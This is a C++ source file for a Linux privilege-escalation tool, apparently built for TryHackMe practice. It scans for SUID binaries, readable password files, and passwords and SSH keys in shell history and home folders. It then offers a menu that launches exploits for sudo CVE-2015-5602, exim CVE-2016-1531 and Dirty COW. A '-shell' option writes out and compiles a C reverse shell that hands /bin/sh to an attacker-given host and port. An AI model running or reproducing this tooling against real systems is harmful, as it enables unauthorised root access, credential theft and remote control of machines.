#include </home/arch/Documents/Programming/TryHackMe/LinuxPriv/LinuxPrivEscalation/headerFiles/CVE-2015-5602-sudo.h>
#include </home/arch/Documents/Programming/TryHackMe/LinuxPriv/LinuxPrivEscalation/headerFiles/dirtyCowExploit.h>
#include </home/arch/Documents/Programming/TryHackMe/LinuxPriv/LinuxPrivEscalation/headerFiles/exim_exploit.h>
#include <bits/stdc++.h>
#include <csignal>
#include <fstream>
#include <iostream>
#include <map>
#include <sstream>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <string>
#include <sys/utsname.h>
#include <unistd.h>
#include <vector>
#define EXIT_FAILURE 1
#define EXIT_SUCCESS 0
/*
 * TODO
 *
 * COMPLETE SHARED OBJECT LIBRARY INJECTION -> IS THIS DONE?, STRACE WORKS FINE.
 * NO NEED TO AUTOMATE THE INJECTION. COMPLETE LD_PRELOAD AND lD_LIBRARY
 * INJECTION -> NEED TO TEST ON THM AS ACTUALLY DOESNT WORK. MAKE PROJECT GIT
 * COMPLIANT ONCE SCANNING IS COMPLETE, MAKE A WAY TO TRY AN EXCECUTE THE
 * EXPLOITS.  MAYBE SUMMARY AT END AND A MENU WITH LIST OF EXPLOITS
 * AVALIABLE(CAN BE DONE WITH MAP). CAN THEN CALL DIRECTLY EXIM_PAYLOAD() AND
 * DIRTYCOW_PAYLOAD()
 *
 * */

std::map<int, std::string> ExploitSum;

void ExploitSummary(void) {
  int ExploitSumSize = ExploitSum.size();
  int answer;

  std::cout << ("\n-----------------------------------------------\n");
  std::cout << "Exploitable Vulnerabilities" << std::endl;
  std::cout << ("------------------------------------------------\n");

  /*std::cout << ExploitSum[1] << std::endl;
  std::cout << ExploitSum[2] << std::endl;
  std::cout << ExploitSum[3] << std::endl;
  std::cout << ExploitSumSize << std::endl;*/
  /*
  if (ExploitSumSize == 0)
  {
          std::cout << "No Exploits Found" << std::endl;
          exit(EXIT_SUCCESS);
  }*/

  for (auto i : ExploitSum) {
    std::cout << i.first << ") " << i.second << '\n';
  }
  std::cout << ("------------------------------------------------\n");
  std::cout << "Select an Exploit" << std::endl;
  std::cout << "> ";

  std::cin >> answer;

  /*if (answer == (i.first)) // IS THIS POSSIBLE? WOULD MAKE MUCH NICER
  {
          std::cout << "\n[!] ARE YOU SURE [Y/N]? --" << i.second << "\n" <<
  std::endl;

  }
  */

  if (answer == 1) {
    std::cout << "\n[!] ARE YOU SURE [Y/N]? -- Sudo <= 1.8.14 Local Privilege "
                 "Escalation\n"
              << std::endl;
    std::string secondAnswer;
    std::cout << "> ";
    std::cin >> secondAnswer;
    if (secondAnswer == "Y" or secondAnswer == "y" or secondAnswer == "yes") {
      std::cout << "[+] Executing SUDO LFE Attack\n" << std::endl;
      sudoCVE();

      exit(EXIT_FAILURE);
    }
    if (secondAnswer == "N" or secondAnswer == "n" or secondAnswer == "no") {
      ExploitSummary();
    } else {
      ExploitSummary();
    }

  } else if (answer == 2) {
    std::cout << "\n[!] ARE YOU SURE [Y/N]? -- CVE-2016-1531 exim <= 4.84-3 "
                 "local root exploit"
              << std::endl;

    std::string secondAnswer;
    std::cout << "> ";
    std::cin >> secondAnswer;
    if (secondAnswer == "Y" or secondAnswer == "y" or secondAnswer == "yes") {
      std::cout << "Executing EXIM Attack" << std::endl;
      exim_payload();
    }
    if (secondAnswer == "N" or secondAnswer == "n" or secondAnswer == "no") {
      ExploitSummary();
    } else {
      ExploitSummary();
    }
  } else if (answer == 3) {
    std::cout
        << "\n[!] ARE YOU SURE [Y/N]? -- CVE 2016-5195(DirtyCow) Kernel Exploit"
        << std::endl;

    std::string secondAnswer;
    std::cout << "> ";
    std::cin >> secondAnswer;
    if (secondAnswer == "Y" or secondAnswer == "y" or secondAnswer == "yes") {
      std::cout << "\n[+] Executing DirtyCow Kernel Exploit\n" << std::endl;
      DirtyCowExploit();
    }
    if (secondAnswer == "N" or secondAnswer == "n" or secondAnswer == "no") {
      ExploitSummary();
    } else {
      ExploitSummary();
    }
  }

  else {
    ExploitSummary();
  }
}

bool CheckIfFileExists(std::string test) {
  std::ofstream file;
  file.open(test);

  if (file) {
    return true;
  } else {

    return false;
  }
}



bool CheckIfStraceExists(std::string test1) {
    std::system("which strace > /tmp/strace.txt 2>/dev/null");
    std::ifstream stracefile;
    stracefile.open("/tmp/strace.txt");
    if (stracefile.is_open())
    {
        std::string data; 
        while(getline(stracefile,data))
        {
            if (data.find("strace not found") != std::string::npos)
            {
                return false;
            }
            else
            {
                return true;
            }
        }
    }
    
    {
        return false; 
    }


}








void DirtyCowCheck(void) {
  // char speechMark = '"';

  struct utsname version;
  int newVersion;
  std::string release;

  if (uname(&version) == -1) {
    std::cout << "Failed" << std::endl;
  } else {
    (EXIT_FAILURE);
  }

  release.push_back(version.release[0]);
  release.push_back(version.release[2]);

  std::stringstream obj;

  obj << release;
  obj >> newVersion;
  // int newVersion1 = 33; FOR TESTING

  if (newVersion >= 50) {
    std::cout << "[-] DirtyCow Attack not compatible\n" << std::endl;

  } else {
    std::cout
        << "[+] DirtyCow Attack Compatible [CVE 2016-5195(DirtyCow) Exploit]"
        << std::endl;
    ExploitSum[3] = "CVE 2016-5195(DirtyCow) Exploit";
  }
}

void kernelShell(void) {
  // char speechMark = '"';
  std::cout << "Retriving Kernel Shell via CVE 2016-5195(DirtyCow) Exploit"
            << std::endl;

  struct utsname version;
  int newVersion;
  std::string release;

  if (uname(&version) == -1) {
    std::cout << "Failed" << std::endl;
  } else {
    std::cout << "Checking Version Compatability" << std::endl;
  }

  release.push_back(version.release[0]);
  release.push_back(version.release[2]);

  std::stringstream obj;

  obj << release;
  obj >> newVersion;
  if (newVersion >= 50) {
    std::cout << "DirtyCow Attack not compatible" << std::endl;
    exit(EXIT_SUCCESS);
  }

  // DIRTYCOW EXPLOIT GOES HERE

  DirtyCowExploit();
}

int writeShell(char *argv[]) // void writeShell(char *argv[])
{
  std::cout << "[+] GENERATING PAYLOAD...." << std::endl;
  putchar('\n');

  std::string lhost = argv[2];
  std::string lport = argv[3];
  int lhostlen = lhost.length();
  char lhostArray[lhostlen];
  char lportArray[11];
  char LHOST[22];
  char LPORT[5];
  char QuotationMark = '"';

  lhost.copy(lhostArray, lhostlen);
  lport.copy(lportArray, 11);

  // int sizeofArray = sizeof(lhostArray)/sizeof(lhostArray[0]);
  // std::cout << sizeofArray << std::endl;

  std::string equalhost;
  std::string equalport;
  equalhost.push_back(lhostArray[5]);

  if (equalhost != "=") {
    std::cout << "LHOST ERROR. Please use LHOST=" << std::endl;
    exit(EXIT_FAILURE);
  }

  equalport.push_back(lportArray[5]);

  if (equalport != "=") {
    std::cout << "LPORT ERROR. Please use LPORT=" << std::endl;
    std::cout << "LOOP LPORT [5]" << lportArray[5] << std::endl;
    exit(EXIT_FAILURE);
  }

  for (int i = 6; i < 21; i++) {
    LHOST[i - 6] = lhostArray[i];
    LPORT[i - 6] = lportArray[i];
  }

  std::stoi(LPORT);
  lport = LPORT;

  std::cout << "-----------------------------------" << std::endl;
  putchar('\n');
  std::string payload = "#include <stdio.h>\n"
                        "#include <sys/socket.h>\n"
                        "#include <sys/types.h>\n"
                        "#include <stdlib.h>\n"
                        "#include <unistd.h>\n"
                        "#include <netinet/in.h>\n"
                        "#include <arpa/inet.h>\n"

                        "int main(void)\n"
                        "{\n"
                        "    int port = " +
                        lport +
                        ";\n"
                        "    struct sockaddr_in revsockaddr;\n"
                        "    int sockt = socket(AF_INET, SOCK_STREAM, 0);\n"
                        "    revsockaddr.sin_family = AF_INET;\n"
                        "    revsockaddr.sin_port = htons(port);\n"
                        "    revsockaddr.sin_addr.s_addr = inet_addr(" +
                        QuotationMark + "" + LHOST + "" + QuotationMark +
                        ");\n"
                        "    connect(sockt, (struct sockaddr *) &revsockaddr,\n"
                        "    sizeof(revsockaddr));\n"
                        "    dup2(sockt, 0);\n"
                        "    dup2(sockt, 1);\n"
                        "    dup2(sockt, 2);\n"
                        "    char * const argv[] = {" +
                        QuotationMark +
                        ""
                        "/bin/sh" +
                        QuotationMark +
                        ", NULL};\n"
                        "    execve(" +
                        QuotationMark +
                        ""
                        "/bin/sh" +
                        QuotationMark +
                        ", argv, NULL);\n"
                        "    return 0;\n"
                        "}\n";

  std::cout << payload << std::endl;
  putchar('\n');
  std::cout << "--------------------------------------" << std::endl;

  putchar('\n');
  std::cout << "[+] DOUBLE CHECK THE PAYLOAD, HAPPY?[Y/N]: ";
  std::string answer;
  std::cin >> answer;
  if (answer == "Y") {
    std::cout << "\n[+] SAVING PAYLOAD" << std::endl;
    std::ofstream outf{"shell.c"};
    if (!outf) {
      std::cerr << "[!] ERROR WRITING PAYLOAD TO FILE\n" << std::endl;
      return 1;
    } else {
      outf << payload;
      try {
        int pid = fork();
        if (pid == 0) {
          std::system("gcc shell.c -o shell");
          exit(EXIT_SUCCESS);
        }
      } catch (int a) {
        std::cerr << "[!] ERROR COMPILING C PAYLOAD VIA GCC" << a << std::endl;
      }
    }
  } else {
    exit(EXIT_FAILURE);
  }
  return 0;
}

void GetShell(void) { std::cout << "Called from GetShell()" << std::endl; }

void SysInfo(void) {
  std::cout << ("\n-----------------------------------------------\n");
  std::system("hostnamectl");
  std::cout << ("------------------------------------------------\n");
}

void WFP(void) {
  std::cout << "" << std::endl;
  std::cout << "[+] Weak Find Permission" << std::endl;
  std::system("ls -al /$HOME/../../etc/passwd");
  std::system("ls -al /$HOME/../../etc/shadow");
  std::system("ls -al /$HOME/../../etc/pwd.db");
  std::system("ls -al /$HOME/../../etc/master.passwd");
  std::system("grep -v '^[^:]*:[x\\*]' /etc/passwd /etc/pwd.db "
              "/etc/master.passwd /etc/group 2>/dev/null");
  // std::system("for d in `echo $PATH | tr ":" "\\n"`; do find $d -name "*.sh"
  // 2>/dev/null; done for d in `echo $PATH | tr ":" "\\n"`; do find $d -type -f
  // -executable 2>/dev/null; done"); // Scripts or binaries in PATH
  std::cout << "" << std::endl;
}

void cronTab(void) {
  std::cout << "[+] Finding CRONTAB schedule..." << std::endl;
  std::system("ls -al /$HOME/../../etc/crontab");
  std::cout << std::endl;
}

void PasswordsAndKeys(void) {
  putchar('\n');
  std::cout << "[+] Finding Passwords & Keys...." << std::endl;
  putchar('\n');
  std::system("~/.*history | grep -e \"-p\" ");
  std::system("~/.*history | grep -e \"-pass\" ");
  std::system("~/.*history | grep -e \"-password\" ");
  std::system("find ~/ -name \"*vpn\"");
  std::system("find ~/ -name \"*.ssh\"");
  std::system("ls -al /$HOME/../../ | grep \".ssh\"");
  putchar('\n');
}

void FindAllsuid(void) {
  std::cout << "[+] Finding all SUID/GUID Executables..." << std::endl;
  std::cout << "" << std::endl;
  // std::system("find / -type f -a \\( -perm -u+s -o -perm -g+s \\) -exec ls -l
  // {} \\; 2> /dev/null"); // EXPORT THIS OUTPUT TO FILE AND THEN READ CONTENTS
  // RATHER THAN DOING TO VARIABLE
  std::system("find / -type f -a \\( -perm -u+s -o -perm -g+s \\) -exec ls  {} "
              "\\; 2> /dev/null > root_files.txt");
  // std::system("sudo -V | grep \"Sudo version\" >> root_files.txt");
  std::system("echo \"Sudo version 1.8.13\" >> root_files.txt"); // USE FOR TESTING
  // std::system("echo \"/usr/bin/exim-4.81\" >> root_files.txt "); USE FOR TESTING
  std::system("cat root_files.txt");
  putchar('\n');

  std::ifstream root_files;
  root_files.open("root_files.txt");

  if (root_files.is_open()) {
    // std::cout << "RootFile is open" << std::endl;
    std::string data;
    std::string exim;

    // Runs with the root_files list and tries to find vulnerable exim.
    while (getline(root_files, data)) {
        if (data.find("/usr/bin/exim-") != std::string::npos) { // /usr/sbin/exim-4.84-3  | /usr/bin/exim-4.84-3 |
                    

        char exim[data.length() + 1];
        // char exim_test[] = "4.84";

        // strcpy(exim, data.c_str());

        for (int i = 14; i < data.length(); i++) {
            exim[i - 14] = data[i];
        }

        double test = std::stod(exim);

        // std::cout << "Exim test: " << test << std::endl;
        // std::cout << "Exim: " << exim << std::endl;

        if (test <= 4.84) {

          std::cout << "[+] Found Exploitable [CVE-2016-1531 exim <= 4.84-3 "
                       "local root exploit]"
                    << std::endl;
          ExploitSum[2] = "CVE-2016-1531 exim <= 4.84-3 local root exploit";

        }
        // putchar('\n');
      }
        if (data.find("usr/sbin/exim-") != std::string::npos)
        {
            char exim[data.length()];
        // char exim_test[] = "4.84";

        // strcpy(exim, data.c_str());

        for (int i = 15; i < data.length(); i++) {
            exim[i - 15] = data[i];
        }

        double test = std::stod(exim);

        // std::cout << "Exim test: " << test << std::endl;
        // std::cout << "Exim: " << exim << std::endl;

        if (test <= 4.84) {

          std::cout << "[+] Found Exploitable [CVE-2016-1531 exim <= 4.84-3 "
                       "local root exploit]"
                    << std::endl;
          ExploitSum[2] = "CVE-2016-1531 exim <= 4.84-3 local root exploit";

        }
        }

         if (data.find("Sudo version ") !=
          std::string::npos) // Sudo version 1.9.12p2
      {
        // std::cout << "Found SUDO Version: " << data << std::endl;
        char sudo[data.length() + 1];
        // char exim_test[] = "4.84";

        // strcpy(exim, data.c_str());

        for (int i = 13; i < data.length(); i++) {
          sudo[i - 13] = data[i];
        }

        double sudoTest = std::stod(sudo);

        // std::cout << "Exim test: " << test << std::endl;
        // std::cout << "sudo: " << sudoTest << std::endl;

        if (sudoTest <= 1.8) {

          std::cout << "[+] Found Exploitable SUDO [Sudo <= 1.8.14 Local "
                       "Privilege Escalation]"
                    << std::endl;
          ExploitSum[1] = "Sudo <= 1.8.14 Local Privilege Escalation";
          // JUST SCANNING

        } else {

          std::cout << "Exploit Not Valid [SUDO]" << std::endl;
        }
      }
    }

  } else

  {
    std::cout << "RootFIle is not open" << std::endl;
  }

  /*

  std::ifstream ifile;
  ifile.open("/usr/sbin/exim-4.8*");
  if(ifile)
  {
          int flagfile = 1;
          std::cout << "File Exists, FLAG: " << flagfile << std::endl;

  }
  else
  {
          int flagfile = 0;
          std::cout << "File Does NOT Exist, FLAG: " << flagfile << std::endl;
  }
  */

  putchar('\n');
}

void sharedObjectLibraryInjection(void) {

  // TODO 02/07/2023 - EVERYTHING WORKS. HOWEVER STD::SYSTEM IS TOO SLOW WITH STRACE
  // IS THERE ANYOTHER WAY TO IMPLEMENT SAME METHOD WITHOUT STD::SYSTEM?
  // create C malware and execute?
  std::string stracePath = "usr/bin/strace";
  CheckIfStraceExists(stracePath);
  // std::cout << "Check file is: " << CheckIfFileExists << std::endl;

  if (CheckIfStraceExists(stracePath) == true) {
        std::system("rm /tmp/strace.txt");
        std::cout << "[+] " << stracePath << " Found, Proceeding with Shared Object Library Injection\n" << std::endl;
        // strace stuff
        std::system("find / -type f -a \\( -perm -u+s -o -perm -g+s \\) -exec ls  "
                "{} \\; 2> /dev/null > root_files.txt");
        std::ifstream root_files;
        root_files.open("root_files.txt");

        if (root_files.is_open()) {
            std::string data;
             while (getline(root_files, data)) {
                if (data.find("/") != std::string::npos){
             
                    
                    std::cout << "strace " + data  << std::endl;
                    std::system(("strace " + data + " 2>&1 | grep -iE \"home\" | grep -iE \"open|access|no such file\" ").c_str());
                }
                    
                }
            }
        }
    

     else {
    std::cout << "[!] " << stracePath
              << " Not Found, Skipping Shared Object Library Injection"
              << std::endl;
  }
}

void SudoL(void) {

    // TODO THIS FUNCTION NEEDS TO BE REWRITTEN


    std::system("sudo -l > sudoL.txt");
    std::system("sudo -l");

  /*int flag = 0;
  try
  {

          std::cout << "CRTL+C if you don't know the SUDO Password" << std::
  endl; const int sudoList = std::system("sudo -l"); std::cout << sudoList <<
  std::endl; flag = 1;

  }
  catch(int a)
  {
          std::cout << "" << std::endl;
          flag = 0;

  }


  return flag;*/
}

int main(int argc, char *argv[]) {
  std::string sudoPass;
  int retflag;
  int LHOST;
  int LPORT;
  int argFlag = 0;

  if (argc == 1) {
    std::cout << "No Argument supplied" << std::endl;
    exit(EXIT_SUCCESS);
  }
  if (std::string(argv[1]) == "-h" || std::string(argv[1]) == "/?") {
    std::cout << "\n-Scan [scan for escalation]\n"
                 "-kernel-shell [Escalate via CVE 2016-5195(DirtyCOw) Use with "
                 "caution]\n"
                 "-shell [Attempts to get a reverse shell ASAP] usage: "
                 "./privesc -shell LPORT=<IP> LPORT=<PORT>\n";
    putchar('\n');
    exit(EXIT_SUCCESS);
  }
  if (std::string(argv[1]) == "-kernel-shell") {
    kernelShell();
  }
  if (std::string(argv[1]) == "-scan") {
    std::cout << "\nScan Mode" << std::endl;

    SysInfo();
    WFP();
    cronTab();
    PasswordsAndKeys();
    FindAllsuid();
    DirtyCowCheck();
    sharedObjectLibraryInjection();
    SudoL();
    ExploitSummary();

    // Scan Functions
    exit(EXIT_SUCCESS);
  }

  if (std::string(argv[1]) == "-shell") {
    std::cout << "Getting Shell" << std::endl;
    // exit(EXIT_SUCCESS);
    if (std::string(argv[2]) != " ") {

      // std::cout << "LHOST: " << argv[2] << std::endl;
      argFlag++;

    } else {
      std::cout << "Please provide LHOST" << std::endl;
    }
    if (std::string(argv[3]) != " ") {
      // std::cout << "LPORT: " << argv[3] << std::endl;
      argFlag++;
    } else {
      std::cout << "Please provide LPORT" << std::endl;
    }
    if (argFlag == 2) {
      // std::cout << "*argv: " << *argv << std::endl;
      // std::cout << "argv[2]: "<< argv[2] << std::endl;
      // std::cout << "argv[3]: "<< argv[3] << std::endl;
      writeShell(argv);
    } else {
      std::cout << "Settings incorrect, try again" << std::endl;
      exit(EXIT_FAILURE);
    }

  }

  else {
    std::cout << "Invalid Arguments" << std::endl;
    exit(EXIT_FAILURE);
  }

  /*std::cout << "Linux Privlege Escalation" << std::endl;
  std::cout << "" << std::endl;
  std::cout << "Enter SUDO password if known" << std::endl;
  std::cin >> sudoPass;

  if (sudoPass == "none")
  {
          std::cout << "Skipping SUDO Pass" << std::endl;
  }
  else
  {
          SudoL();

  }*/

  // retflag = SudoL();
  // if (retflag == 1)

  SysInfo();
  WFP();
  cronTab();
  FindAllsuid();

  SudoL();

  return 0;
}
